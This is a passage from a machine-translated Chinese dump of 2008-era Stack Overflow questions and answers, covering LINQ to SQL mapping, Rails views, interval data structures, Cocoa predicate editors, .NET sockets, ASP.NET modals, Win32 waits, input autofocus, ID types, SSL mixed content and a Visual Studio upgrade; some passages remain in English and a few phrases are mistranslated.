例如，我的表在数据库中定义如下：

```
CREATE TABLE User_Entry (
    UserId int IDENTITY (1, 1) NOT NULL,
    Login_Id varchar (50) NOT NULL,
    Active char(1) NOT NULL,
    PASSWORD varchar(75) NULL
) 
```

这是它映射到的类（由 LINQ 设计器生成......为简洁起见，LINQ 属性和其他内容省略了）：

```
public partial class User
{
    int UserId;
    string Login;
    string Active,
    string Pwd
} 
```

当我执行以下操作时，不会填充 Login 和 Pwd 属性，但会填充 UserId 和 Active 属性。

```
Data.DbContext db = new Data.DbContext();

IQueryable query = db.Users.Where(usr => usr.Login == request.LoginString);

SqlCommand cmd = (SqlCommand)data.GetCommand(query);

... execute the command (asynchronously) ...

User user = db.Translate<User>( dataReaderResult ).FirstOrDefault(); 
```

！此时，我检查了用户对象，我可以看到 Login 和 Pwd 列没有填充！

这是生成的sql：

```
exec sp_executesql N'SELECT [t0].[UserID] AS [UserId], [t0].[Login_ID] AS [Login], [t0].[Active], [t0].[PASSWORD] AS [Pwd]
FROM [dbo].[User_Entry] AS [t0]
WHERE [t0].[Login_ID] = @p0', N'@p0 varchar(13)', @p0 = 'test_user' 
```

最初，当 UserId 列具有不同的属性名称时，我得到了一个异常`The required column [UserId] does not exist in the results`。我环顾四周，看到一些 MSFT 人员的回复说这是一个错误。

这有关系吗？它曾经修复过吗？有谁知道什么时候修复？

编辑：更多信息。

我认为与此有关的错误有 Kathy Lu MSFT 于 2007 年 8 月 14 日[在这里](https://forums.microsoft.com/msdn/ShowPost.aspx?PostID=1983746&SiteID=1&pageid=0)发表的评论，她说：

> 感谢您报告此问题。根据您的问题，我们能够重现该问题，并且产品团队正在研究适当的分类和解决方案。

我想知道这是否与我正在经历的事情有关，以及我是否可以获得更多信息。我搜索`linq translate site:connect.microsoft.com`但我没有找到任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T03:21:51.067

列属性设置是否正确？有一个名称属性。

[http://msdn.microsoft.com/en-us/library/system.data.linq.mapping.columnattribute_members.aspx](http://msdn.microsoft.com/en-us/library/system.data.linq.mapping.columnattribute_members.aspx)

此外，[Translate 的文档](http://msdn.microsoft.com/en-us/library/bb548792.aspx)……您想要被映射（如第一个要点）。

* * *

将结果中的列与对象中的字段和属性匹配的算法如下：

*   如果字段或属性映射到特定列名，则该列名应出现在结果集中。
*   如果未映射字段或属性，则结果集中需要与字段或属性同名的列。
*   通过首先查找区分大小写的匹配来执行比较。如果未找到此匹配项，则会对不区分大小写的匹配项进行后续搜索。

* * *

哦等等，你正在使用通用的翻译重载。使用 Type 参数尝试 Translate 重载，看看它是否对您更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-04-20T15:23:47.107

我认为与此相关的错误有 Kathy Lu MSFT 于 2007 年 8 月 14 日发表的评论，她说“感谢您报告此问题。从您的问题中，我们能够重现该问题，并且产品团队正在研究适当的分类和分辨率。” 来自[https://forums.microsoft.com/msdn/ShowPost.aspx?PostID=1983746&SiteID=1&pageid=0](https://forums.microsoft.com/msdn/ShowPost.aspx?PostID=1983746&SiteID=1&pageid=0)

我想知道这是否与我正在经历的事情有关，以及我是否可以获得更多信息。我搜索了（ linq translate site:connect.microsoft.com ），但没有找到任何东西。

# ruby-on-rails - 如何从视图访问嵌套模型？

> ID：210725
> 
> 赞同：1
> 
> 时间：2008-10-17T00:18:05.447
> 
> 标签：ruby-on-rails, ruby

我的页面上有这样的下拉菜单：

```
<p>
     <%= f.label :episode_id %><br />
     <%= f.collection_select(:episode_id, @episodes, :id, :show) %>
</p> 
```

一集有一个id，`belongs_to`一个节目有一个名字。在下拉列表中，我想显示节目名称。 `:show.name`无法显示名称。我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T01:22:08.563

一种方法是在您的 Episode 类中创建一个方法，`show_name`如下所示：

```
def show_name
  show.name
end 
```

您传递给 collection_select 的最后一个符号是您要调用以获取选项文本的方法的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-17T02:17:32.743

我不知道这是否可行，但你试过了`episode.show.name`吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T02:19:08.213

您可以使用#select 而不是#collection_select。您需要做更多的工作来构造值/文本对，但这还不错。

```
f.select(:episode, :id, @episodes.map{|e| [e.show.name, e.id]}) 
```

# database-design - 单个维度内不重叠范围的数据结构

> ID：210729
> 
> 赞同：9
> 
> 时间：2008-10-17T00:21:11.417
> 
> 标签：database-design, data-structures, normalizing

我需要一个可以在单个维度内存储非重叠范围的数据结构。不需要完全覆盖整个尺寸范围。

一个例子是会议室调度程序。维度是时间。没有两个时间表可以重叠。会议室并不总是安排好的。换句话说，对于给定的时间，最多可以有一个时间表。

一个快速的解决方案是使用一个范围来存储开始和结束时间。

```
Range {
    Date start
    Date end
} 
```

这是非规范化的，需要容器强制不重叠。对于两个相邻的范围，前一个结束将与下一个开始冗余。

另一种方案可能涉及为每个范围存储一个边界值。但是对于连续的范围序列，边界值总是比范围多一个。为了解决这个问题，序列可以表示为交替的边界值和范围：

B = 边界值，r = 范围

> 溴化溴

数据结构可能如下所示：

```
Boundary {
    Date value
    Range prev
    Range next
}

Range {
    Boundary start
    Boundary end
} 
```

从本质上讲，它是一个具有交替类型的双向链表。

最终，我使用的任何数据结构都将在内存（应用程序代码）和关系数据库中表示。

我很好奇存在哪些学术或行业尝试过的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T00:32:10.287

表示数据的*标准化*方式是为每个时间单位存储一条记录。这可以在会议安排应用程序的示例中完成。您的约束将是唯一的约束

```
(RoomId, StartTime) 
```

在连续范围的情况下，您必然需要存储 2 个东西，一个边界和第二个边界或长度。它通常是通过存储第二个边界然后在该类型的两个边界上创建一个约束来完成的

```
(boundary not between colBoudaryA and colBoundaryB) 
```

加上额外的约束

```
(startBoundary < endBoundary) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T00:33:46.320

双向链表效果很好，因为您只使用填充范围的内存，并且您只需要检查插入的重叠 - 在这一点上这样做几乎是微不足道的。如果有重叠，则新项目将被拒绝。

```
房间号
预订编号
上一个预订ID
下一个预订ID
开始时间日期
结束时间日期
优先
用户身份

```

优先级和用户 ID 允许日程安排具有优先级（教授可能比学生组更有影响力），以便新项目可以在插入过程中“敲掉”较低优先级的项目，用户 ID 允许电子邮件发送给颠簸的会议组织者。

您需要考虑添加一个指向每天第一次会议的表格，以便优化搜索。

-亚当

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-07-26T14:28:20.187

1.  对于非重叠间隔，您可以使用起点对间隔进行排序。当您向此结构添加新间隔时，您只需检查起点和终点是否不属于此间隔集。要检查某个点 X 是否属于区间集，您可以使用二进制搜索来找到最近的起点并检查 X 是否属于它的区间。这种方法对于修改操作不是那么理想。

2.  您可以查看[间隔树](http://en.wikipedia.org/wiki/Interval_tree)结构 - 对于非重叠间隔，它具有最佳查询和修改操作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-09-30T03:57:13.333

如果你足够幸运（！）能够使用 Postgres，你可以使用一个`tstzrange`列，并应用一个约束来防止重叠。使用范围类型的好处是它会固有地防止开始大于结束。

```
ALTER TABLE "booking" 
ADD CONSTRAINT "overlapping_bookings" 
EXCLUDE USING gist ("period" WITH &&, "room" WITH =); 
```

您可能需要`CREATE EXTENSION IF NOT EXISTS btree_gist`，因为如果没有该扩展名，则不支持使用 && 创建要点。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T00:34:03.683

很大程度上取决于您将如何处理数据，因此哪些操作需要高效。但是，我会考虑在 Start 和 End 的设置器中使用逻辑的 Ranges 的双向链接列表，以检查它现在是否与其邻居重叠，如果是，则缩小它们（或抛出异常，或者您想要处理尝试重叠）。

这提供了一个很好的简单链接列表，其中包含要阅读的预定时间段，但没有容器负责维护不重叠规则。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-17T01:21:36.240

[这在约束编程](http://en.wikipedia.org/wiki/Constraint_programming)世界中称为“一元资源”约束。这方面有很多研究，特别是针对事件时间不固定的情况，您需要为每个事件找到时间段。有一个商业 C++ 包可以解决您的问题和更多[Ilog CP](http://www.ilog.com/products/cp/)，但这可能是矫枉过正。还有一个名为[eclipse](http://87.230.22.228/)的开源版本（与 IDE 无关）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-17T03:51:33.550

这很重要，因为（在数据库世界中）您必须比较多行以确定不重叠的范围。显然，当信息在内存中时，其他表示形式（例如按时间顺序排列的列表）也是可能的。不过，我认为最好使用“开始 + 结束”符号，即使在列表中也是如此。

有关于这个主题的整本书——“时间数据库”处理的一部分。你可以看的两个是 Darwen、Date 和 Lorentzos “[时间数据和关系模型](https://rads.stackoverflow.com/amzn/click/com/B001E4587Q)”和（在一个完全不同的极端）“[在 SQL 中开发面向时间的数据库应用程序](https://rads.stackoverflow.com/amzn/click/com/1558604367)”，Richard T. Snodgrass，Morgan Kaufmann Publishers, Inc.，旧金山，1999 年 7 月，504+xxiii 页，ISBN 1-55860-436-7。那是绝版的，但可以在他的网站[cs.arizona.edu](http://www.cs.arizona.edu/~rts/publications.html)上以 PDF 的形式获得（所以谷歌搜索很容易找到）。

我相信，其中一个相关的数据结构是[R-Tree](http://en.wikipedia.org/wiki/R-tree)。这通常用于二维结构，但也适用于一维结构。

您还可以查找“[艾伦的关系](http://en.wikipedia.org/wiki/Allen%27s_Interval_Algebra)”以了解间隔 - 它们可能对您有所帮助。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-19T13:35:17.940

我已经成功存储了开始时间和持续时间。重叠测试类似于

```
WHERE NOT EXISTS (
   SELECT 1 FROM table
   WHERE BeginTime < NewBeginTime AND BeginTime + Duration > NewBeginTime
)
AND NOT EXISTS (
   SELECT 1 FROM table
   WHERE NewBeginTime < BeginTime AND NewBeginTime + NewDuration > BeginTime
) 
```

我认为没有测试，但希望你能理解

# cocoa - 为多键自动生成谓词行模板？

> ID：210735
> 
> 赞同：3
> 
> 时间：2008-10-17T00:24:26.853
> 
> 标签：cocoa, core-data, nspredicateeditor

在我的核心数据托管对象模型中，我有一个实体 Foo，它与名为 baz 的实体 Baz 具有一对多关系（具有一对多逆向）。Baz 有一个名为“tag”的字符串属性。当我使用`[NSPredicateRowEditorTemplate templatesWithAttributeKeyPaths:[NSArray arrayWithObject:@"baz.tag"] inEntityDescription:FooDescription]`为 NSPredicateEditor 创建行编辑器时，结果包含（如预期的那样）一个行模板，如

[弹出：baz.tag] [弹出：包含|是|不是|...] [TextField]

当我从弹出窗口中选择“包含”时，带有谓词的查询按预期工作。如果我选择任何其他弹出窗口（例如“is”），我会收到以下错误：“此处不允许对多键”。我可以使用`[NSPredicateRowEditorTemplate templatesWithAttributeKeyPaths:inEntityDescription:]`还是必须手动构建行编辑器？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-22T18:18:27.603

看起来自动生成的模板（使用`[NSPredicateRowEditorTemplate templatesWithAttributeKeyPaths:inEntityDescription:]`）无法生成正确的运算符。解决方案是使用手动创建模板`[NSPredicateEditorRowTemplate initWithLeftExpressions:rightExpressionAttributeType:modifier:operators:options:]`。对于给定的示例：

```
id template = [[NSPredicateEditorRowTemplate initWithLeftExpressions:[NSArray arrayWithObject:[NSExpression expressionForKeyPath:@"baz.tag"]] rightExpressionAttributeType:NSStringAttributeType modifier:NSAnyPredicateModifier operators:keywordOperators options:0]; 
```

# c# - .net/C# 中的网络

> ID：210738
> 
> 赞同：3
> 
> 时间：2008-10-17T00:26:48.143
> 
> 标签：c#, .net, networking, asynchronous

有人可以指出我学习如何在 C#/.net 3.5 中建立网络的正确方向吗？欢迎代码示例和解释。基本上我正在寻找如何做异步/多线程服务器/客户端模型。

我对如何使用 WinSock 在 C++ 中完成此任务的基础知识相当满意，但尽管我的所有研究似乎都无法在 C# 中掌握这个概念。

感谢您提供的任何帮助:)

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-10-17T01:57:42.050

如果 WCF 满足您的需求，那么值得一看。[ZeroC](http://www.zeroc.com)和其他替代的更高级别的库存在。否则，如果您需要的话，有几种不同的方法可以更接近套接字级别。

### TcpClient/UdpClient

这些在底层套接字周围提供了一个相对较薄的包装。它本质上在套接字上提供了一个流。您可以在 NetworkStream 上使用异步方法（BeginRead 等）。我不喜欢这个，因为包装器没有提供那么多，而且它往往比直接使用套接字更尴尬。

### 插座 - 选择

This provides the classic Select technique for multiplexing multiple socket IO onto a single thread. Not recommended any longer.

### Socket - APM Style

The Asynchronous Programming Model (AKA IAsyncResult, Begin/End Style) for sockets is the primary technique for using sockets asynchronously. And there are several variants. Essentially, you call an async method (e.g., BeginReceive) and do one of the following:

1.  Poll for completion on the returned IAsyncResult (hardly used).
2.  Use the WaitHandle from the IAsyncResult to wait for the method to complete.
3.  Pass the BeginXXX method a callback method that will be executed when the method completes.

The best way is #3 as it is the usually the most convenient. When in doubt, use this method.

Some links:

*   [MSDN Magazine Article on Sockets](http://msdn.microsoft.com/en-us/magazine/cc300760.aspx)
*   [A Jeffery Richter Article on the Asynchronous Programming Model](http://msdn.microsoft.com/en-us/magazine/cc163467.aspx)

### .NET 3.5 High Performance Sockets

.NET 3.5 introduced a new model for async sockets that uses events. It uses the "simplified" async model (e.g., Socket.SendAsync). Instead of giving a callback, you subscribe to an event for completion and instead of an IAsyncResult, you get SocketAsyncEventArgs. The idea is that you can reuse the SocketAsyncEventArgs and pre-allocate memory for socket IO. In high performance scenarios this can be much more efficient that using the APM style. In addition, if you do pre-allocate the memory, you get a stable memory footprint, reduced garbage collection, memory holes from pinning etc. Note that worrying about this should only be a consideration in the most high performance scenarios.

*   [MSDN Magazine: Get Connected With The .NET Framework 3.5](http://msdn.microsoft.com/en-us/magazine/cc163356.aspx)
*   [MSDN Information with technique for pre-allocating memory](http://msdn.microsoft.com/en-us/library/system.net.sockets.socketasynceventargs.aspx)

### Summary

For most cases use the callback method of the APM style unless you prefer the style of the SocketAsyncEventArgs / Async method. If you've used CompletionPorts in WinSock, you should know that both of these methods use CompletionPorts under the hood.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-17T00:52:44.787

在 .NET 3.5 世界中，您绝对应该学习[Windows Communication Foundation](http://msdn.microsoft.com/en-us/netframework/aa663324.aspx) - .NET 网络框架。

有用的链接：

[同步和异步操作（在 WCF 中）](http://msdn.microsoft.com/en-us/library/ms734701.aspx)

[您可以在 StackOverflow 浏览带有 WCF](https://stackoverflow.com/questions/tagged/wcf)标记的帖子上找到有用的 WCF 信息

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T00:53:53.130

这取决于你想关注什么。

如果您想专注于功能并将管道留给框架，请从 Windows Communication Foundation 开始。

如果您想建立自己的管道，请使用`System.Net.Sockets.Socket`类。

# cocoa - 为自动生成的谓词行模板修改 NSDatePicker

> ID：210743
> 
> 赞同：0
> 
> 时间：2008-10-17T00:28:03.713
> 
> 标签：cocoa, core-data, nspredicateeditor

如何修改由返回的属性`NSDatePickerElementFlags`的`NSDatePicker`行内模板？我想显示小时：分钟以及日期。`NSDate``[NSPredicateRowEditorTemplate templatesWithAttributeKeyPaths:inEntityDescription:]``NSDatePicker`

**更新** 我在下面添加了一个答案，从 cocoa-dev 列表中收集。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-22T17:59:18.783

您可能可以通过`templateViews`返回的行模板来设置此属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-24T06:57:47.620

Per Peter Ammon，在 cocoa-dev 上，正如 Ben 所指出的，最简单的方法是直接修改日期选择器`-templateViews`：

```
[[[template templateViews] objectAtIndex:2] setDatePickerElements:...] 
```

根据彼得的说法，元素的顺序`-templateViews`保证是恒定的。

# c# - Asp.Net：Javascript 模式窗口

> ID：210745
> 
> 赞同：3
> 
> 时间：2008-10-17T00:28:21.667
> 
> 标签：c#, asp.net, javascript, modal-dialog

我想创建一个 javascript 模式弹出窗口，以从 ASP.Net 2.0 网页中的用户那里获取一些值。

基本思路是这样的。当用户单击按钮时，会出现一个模式窗口并询问 3 或 4 个问题。当此窗口打开时，将无法更改 asp.net 页面。一旦问题得到回答，我需要从这个窗口中获取值，以便 asp.net 页面可以访问它们并可以在后面的代码中处理它们。

我能否获得一些有关如何实施此方案的示例。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-17T00:30:04.083

你看过 ModalPopupExtender 吗？

[http://www.asp.net/ajax/ajaxcontroltoolkit/samples/modalpopup/modalpopup.aspx](http://www.asp.net/ajax/ajaxcontroltoolkit/samples/modalpopup/modalpopup.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T01:07:37.890

最简单的方法是使用 Jon 提到的 ModalPopupExtender 或可能使用 jQuery 的thickbox 或类似的东西。

否则，您可以滚动自己的 JS 来执行此操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T08:51:10.827

您可以使用 javascript 函数“window.showModalDialog”，但它仅适用于 Internet Explorer。

您可以通过将它们包装到一个对象中来传入和返回任意数量的变量。

# windows - 为什么 WaitForSingleObject 会返回 WAIT_FAILED

> ID：210751
> 
> 赞同：6
> 
> 时间：2008-10-17T00:32:34.560
> 
> 标签：windows, winapi, mutex

MSDN 说

> 如果函数失败，则返回值为 WAIT_FAILED。要获取扩展错误信息，请调用 GetLastError。

代码是：

```
HANDLE     m_mutex_handle;    /**< m_mutex_handle. The handle to the created mutex. */
m_mutex_handle = ::CreateMutex( 0, false, NULL );
::WaitForSingleObject( m_mutex_handle, INFINITE ); 
```

但是可能发生的原因是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-17T00:56:21.750

如果您缺少对象的 SYNCHRONIZE 权限，那么您不能等待。WAIT_FAILED 将被返回。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-17T00:41:33.997

传入一个伪造的对象可能会导致这种情况。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T00:46:24.487

在等待句柄时关闭句柄也会导致未定义的行为。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-14T20:00:19.907

当传入线程句柄数组时，我从 WaitForMultipleObjects 获得了 WAIT_FAILED，因为其中一个是伪句柄。正如不朽的 Raymond Chen 解释的那样，并提供了修复：[https ://devblogs.microsoft.com/oldnewthing/20141015-00/?p=43843](https://devblogs.microsoft.com/oldnewthing/20141015-00/?p=43843)

# json - 在浏览器/客户端过滤 JSON 数据

> ID：210754
> 
> 赞同：5
> 
> 时间：2008-10-17T00:34:08.443
> 
> 标签：json

这是场景——您在浏览器上有一个 JSON 对象，假设它有一个布尔属性，称为“Active”。我们想创建一个新的 JSON 对象，它只包含 Active = True 的项目。除了遍历整个 JSON 对象之外，有没有一种简单的方法可以做到这一点？

我基本上是在尝试使用 ASP.Net AJAX 模板来根据用户选择的下拉列表显示可以处于活动状态或非活动状态的项目列表。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-17T00:44:09.653

查看：

*   [JSLINQ](http://jslinq.codeplex.com/)
*   斯蒂尔的[功能](http://osteele.com/sources/javascript/functional/)
*   [下划线.js](http://documentcloud.github.com/underscore/)

# javascript - 如何在页面加载时自动选择输入字段及其中的文本

> ID：210761
> 
> 赞同：77
> 
> 时间：2008-10-17T00:43:09.517
> 
> 标签：javascript, html

页面加载后，我想将光标移动到特定字段。没问题。但我还需要选择并突出显示该文本字段中的默认值。

* * *

## 回答 #1

> 赞同：118
> 
> 时间：2008-10-17T00:44:58.983

来自[http://www.codeave.com/javascript/code.asp?u_log=7004](http://www.codeave.com/javascript/code.asp?u_log=7004)：

```
var input = document.getElementById('myTextInput');
input.focus();
input.select();
```

```
<input id="myTextInput" value="Hello world!" />
```

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2010-11-13T23:00:40.500

在您的输入标签中，放置以下内容：

```
onFocus="this.select()" 
```

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2016-06-06T08:35:14.170

试试这个。这适用于 Firefox 和 chrome。

> `<input type="text" value="test" autofocus="autofocus" onfocus="this.select()">`

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2008-10-17T06:03:30.023

在页面加载时执行此操作：

```
window.onload = function () {
  var input = document.getElementById('myTextInput');
  input.focus();
  input.select();
}
```

```
<input id="myTextInput" value="Hello world!" />
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2014-12-05T23:14:14.657

我发现了一个非常简单的方法，效果很好：

```
<input type="text" onclick="this.focus();this.select()"> 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-07-01T14:00:43.760

使用 jquery 时...

html:

```
<input type='text' value='hello world' id='hello-world-input'> 
```

jQuery：

```
$(function() {
  $('#hello-world-input').focus().select();
}); 
```

示例：[https ://jsfiddle.net/seanmcmills/xmh4e0d4/](https://jsfiddle.net/seanmcmills/xmh4e0d4/)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-05-23T17:06:21.207

在您的输入标签中使用这样的自动对焦

```
<input type="text" autofocus> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-07-19T07:29:29.953

```
 var input = document.getElementById('myTextInput');
    input.focus();
    input.setSelectionRange( 6,  19 );
```

```
 <input id="myTextInput" value="Hello default value world!" />
```

选择文本字段上的特定文本

你也可以像这样使用

```
input.selectionStart = 6;
input.selectionEnd = 19; 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-01-14T12:31:55.747

使用该`autofocus`属性适用于文本输入和复选框。

```
<input type="text" name="foo" value="boo" autofocus="autofocus"> FooBoo
<input type="checkbox" name="foo" value="boo" autofocus="autofocus"> FooBoo 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-06-10T13:58:10.303

让输入文本字段在页面加载时自动获得焦点：

```
<form action="/action_page.php">
  <input type="text" id="fname" name="fname" autofocus>
  <input type="submit">
</form> 
```

来源：[https ://www.w3schools.com/tags/att_input_autofocus.asp](https://www.w3schools.com/tags/att_input_autofocus.asp)

# types - 您使用什么数据类型来存储 ID？

> ID：210770
> 
> 赞同：4
> 
> 时间：2008-10-17T00:49:50.687
> 
> 标签：types, identifier

为什么发布问题有最低字符数？oO

你使用 int、bigint、tinyint 什么的？

我猜这似乎是一件小事，我只是想知道通常的做法是什么

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-17T00:53:43.847

这一切都取决于......我最喜欢的问题答案！=)

大多数时候我们使用Guids。虽然它们在大小方面比 int、tinyint 等更大，但我喜欢这样一个事实，即我的业务对象可以在将记录插入数据库 **之前****知道**值是什么。

 **在其他时候，我可能会使用字符串，例如客户 ID，在使用数据库时可能需要轻松**识别**它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T00:52:41.573

我发现 int 很大。

变小是没有意义的。. .

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T01:07:24.990

我们也使用 GUID。

将多个外部数据库同步到一个数据仓库中效果更好。缺点是很难确定首先创建了哪些项目，但如果这确实是一个问题，您仍然可以存储创建日期或自动编号。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T01:33:59.053

我非常喜欢Guid。最好的事情是它们可以很容易地在客户端或服务器上生成，而无需访问数据库。此外，如果您必须同步数据库，它们将是上帝发送的。我发现的唯一缺点是使用网络应用程序，如果您在 url 上传递密钥，那么您很容易得到凌乱的查询字符串。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T00:53:51.647

难道这不取决于您在应用程序的整个生命周期内可能需要存储多少个 id 吗？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-17T00:55:07.183

需要更多信息。你存储什么样的ID？任何小于 int 的东西都可能是个坏主意，一个字符串可能是有意义的，因为它没有数字用完的小问题，并且不受数字的约束，所以你可以使用用户名作为 id，例如。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-17T02:00:25.163

关于在使用 guid 时总是有一个比较列，我会回应 Jason。我更喜欢序列而不是指南，因为无论哪种方式你都想要一个序列。

数据类型方面，这取决于您需要存储多少条记录，但通常 int 就足够了。

# asp.net - 为什么Firefox在此页面上说“连接部分加密”？

> ID：210778
> 
> 赞同：0
> 
> 时间：2008-10-17T00:55:30.020
> 
> 标签：asp.net, html, firefox, ssl, google-chrome

这是页面：

[https://www.testmasters.net/test/ssltest2.aspx](https://www.testmasters.net/test/ssltest2.aspx)

当我转到它（在 Firefox 或 chrome 中）时，它显示“连接部分加密”。但据我所知，所有对对象的引用都是 https 而不是 http。

奇怪的是，如果您删除了RequiredFieldValidator，页面就可以正常工作。这是源代码（ASP.NET 3.5）：

```
<%@ Page Language="C#" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>SSL Test</title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        SSL Test #1
        <asp:TextBox runat='server' ID='textDude' />
        <asp:RequiredFieldValidator runat='server' ID='requiredDude' ControlToValidate='textDude'
            Display='Dynamic' />
    </div>
    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T00:59:30.763

我回答了我自己的问题。WebResource.axd 不仅通过 http 而不是 https。

# c++ - 从 Visual Studio 2005 升级到 Visual Studio 2008 的陷阱

> ID：210782
> 
> 赞同：8
> 
> 时间：2008-10-17T00:59:08.173
> 
> 标签：c++, visual-studio-2008, visual-studio-2005, upgrade

我已经阅读了许多帖子，吹捧从 VS 2005 迁移到 2008 的优点。但是，我很想听听实际进行迁移时的各种陷阱。我们即将迁移，我更愿意知道要预测和计划哪些减速带，而不是在途中意外发现它们。任何对此有用的指导将不胜感激，以使该过程尽可能轻松。

哦，我们主要是一家 C++ 开发公司，拥有少量中等规模的产品和一堆小型辅助工具。我们对所有内容都使用外部 makefile，以便所有构建都易于自动化。关于迁移此类开发操作时的预期内容的具体见解将是最有帮助的。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T01:17:07.717

如果您使用任何 Visual Studio 插件，您可能会遇到兼容性问题 - 当我们第一次切换到它时，还没有支持 2008 的 Resharper 版本，所以这在当时是一个小问题。除此之外，我们对 IDE 本身并没有任何问题。话虽如此，我们并没有做很多 C++，所以我不确定你的情况会有多不同。

想一想，我们在使用 switch 时遇到的唯一问题是使用 nant 构建 .Net 3.5 应用程序。你没有说你使用什么构建工具或者你是否做了任何托管代码，所以我不确定这对你来说是否是个问题。如果是这样，网络上有一些解决方法可以让 nant 与 3.5 应用程序一起工作，其中涉及调整 nant 的配置文件。如果您希望我发布它，请告诉我。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-17T02:25:07.533

我之前公司的升级经历如下：

*   我们体验到了更高的可靠性，尤其是当我们拥有大量多线程且调试起来很痛苦的应用程序时。
*   VS2008 速度更快，内存消耗更少（至少对于一个包含 50 个项目的解决方案）。
*   我们的一些 C++ 代码将不再在 NT 系统上运行。这可以通过使用旧的可执行的editbin（例如来自VS2003）来修改二进制文件作为发布事件的一部分来解决。
*   升级到 VS2008 后，项目文件也会随之更新。因此，如果您必须在两个 IDE 之间来回切换（例如，并非所有开发人员都已转换），那么可能会出现问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-17T02:38:23.497

我们发现它并不完全可靠。大多数时候都很好，但是我们中的一些人有几天似乎每五分钟就崩溃一次。坦率地说，它也感觉有点马车，例如。SP1 没有为我们修复的资源存在一些巡回错误。

一些“链接时间代码生成”的东西在迁移过程中显然是自动打开的，而且 IMO 太慢了。从 30 秒到 7 分钟的链接时间非常难以接受。又把那个关了...

从好的方面来说，调试速度要快得多，当您在一些耗时的代码中遇到错误时，这是​​一个很大的优势。不过，我们不相信发布构建速度。

尽管如此，其他语言中可能还有很多很棒的功能，但据我所知，Visual C++ 团队在这三年间显然没有那么忙（或者可能只剩下两个？）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T01:09:59.603

我对 Visual Studio 2008的**唯一**问题是它非常慢，直到我稍微调整一下。我遇到了大约 8-10 秒左右从调试模式出来的延迟——这*很*烦人。SP1 帮助了修改一些 IE 设置。

但除此之外，我对此很满意。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-11-02T00:46:47.493

可靠性大大提高。日常功能集不变（这是应该的）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-16T10:10:35.383

我在没有意识到更改的情况下遇到了一个问题（我也有一个问题帖子）安装程序的行为可能会有所不同。旧的升级更多的是卸载和重新安装。新的进行就地升级。这可能会导致问题：

1.  需要将版本信息放入 DLL - 不是坏事，但可能不是你自动化的步骤

2.  开箱即用，服务无法自动升级，您需要强制用户卸载旧的然后安装新的（TODO：我的问题帖子的引用要添加到这里）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-16T10:29:06.470

我只遇到了两个问题。

1.  当我们第一次使用 RTM 迁移到 2008 年时，一些第 3 方加载项不起作用。我不记得是哪些，但我没有遇到过我们当前使用的任何加载项。

2.  如果您使用的是 Team Edition 或 Team Suite，则有一些 3rd 方签入策略不起作用，因为它们引用了 2005 TFS API。我们可以通过使用适当的引用重新编译我们有代码的东西（比如从 CodePlex 拉下来的东西）或重写策略来解决这个问题，因为它们相当简单。

就像我提到的，我们遇到的唯一问题是 3rd 方可扩展性，几个月内没有任何问题。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-17T01:34:44.607

